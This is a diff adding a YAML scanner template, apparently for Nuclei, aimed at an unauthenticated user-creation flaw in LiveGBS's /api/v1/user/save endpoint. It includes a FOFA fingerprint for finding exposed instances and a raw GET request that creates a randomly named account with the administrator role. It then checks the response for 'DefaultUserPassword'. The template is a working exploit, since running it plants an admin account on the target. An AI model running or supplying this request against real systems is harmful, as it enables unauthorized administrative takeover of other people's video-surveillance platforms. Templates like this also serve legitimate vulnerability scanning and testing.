@@ -1,0 +1,37 @@
+id: LiveGBS-user_save-User-addition
+
+info:
+  name: "LiveGBS user 接口逻辑缺陷漏洞"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: icon_hash="-206100324"
+    LiveGBS系统在user/save接口实现中存在逻辑缺陷，攻击者可通过该缺陷在未授权情况下执行用户创建操作，进而实现对后台管理权限的非授权获取。此漏洞允许远程攻击者绕过身份验证机制，通过构造特定请求参数创建任意管理员账户，最终导致敏感信息泄露、系统控制权丧失及服务中断等安全风险。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140137358
+  tags: LiveGBS
+
+variables:
+  username: "{{to_lower(rand_base(5))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+
+http:
+- raw:
+  - |
+    GET /api/v1/user/save?ID=&Username={{username}}&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'DefaultUserPassword'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
